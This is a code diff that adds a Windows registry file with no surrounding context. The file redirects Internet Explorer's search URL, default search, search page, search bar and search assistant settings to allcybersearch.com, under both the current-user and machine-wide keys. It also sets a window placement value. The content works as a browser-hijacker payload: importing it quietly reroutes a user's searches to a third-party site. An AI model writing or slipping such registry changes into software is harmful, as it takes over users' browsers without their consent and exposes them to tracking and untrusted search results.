@@ -1,0 +1,19 @@
+REGEDIT4
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer]
+"SearchURL"="http://www.allcybersearch.com/ie/"
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+"Default_Search_URL"="http://www.allcybersearch.com/ie/"
+"Search Page"="http://www.allcybersearch.com/ie/"
+"Search Bar"="http://www.allcybersearch.com/ie/"
+"SearchURL"="http://www.allcybersearch.com/ie/"
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Search]
+"SearchAssistant"="http://www.allcybersearch.com/ie/"
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search]
+"SearchAssistant"="http://www.allcybersearch.com/ie/"
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+"Window_Placement"=hex:2c,00,00,00,02,00,00,00,03,00,00,00,b8,0b,00,00,b8,0b,00,00,fc,ff,ff,ff,fc,ff,ff,ff,51,00,00,00,51,00,00,00,a9,02,00,00,e5,01,00,00
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\WebBrowser]
+
+
